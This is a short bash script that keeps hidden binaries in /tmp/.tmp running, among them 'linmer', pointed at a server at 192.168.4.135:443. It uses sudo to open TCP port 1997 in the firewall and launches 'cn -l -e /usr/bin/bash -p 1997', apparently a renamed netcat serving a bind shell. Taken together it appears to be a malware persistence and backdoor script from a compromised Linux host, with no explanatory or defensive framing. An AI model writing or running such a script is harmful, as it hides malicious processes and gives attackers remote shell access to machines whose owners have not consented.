#!/usr/bin/bash

pgrep girmx > /dev/null || /tmp/.tmp/girmx
pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443

sudo firewall-cmd --permanent --zone=public --add-port=1997/tcp
sudo firewall-cmd --reload
pgrep girmx > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997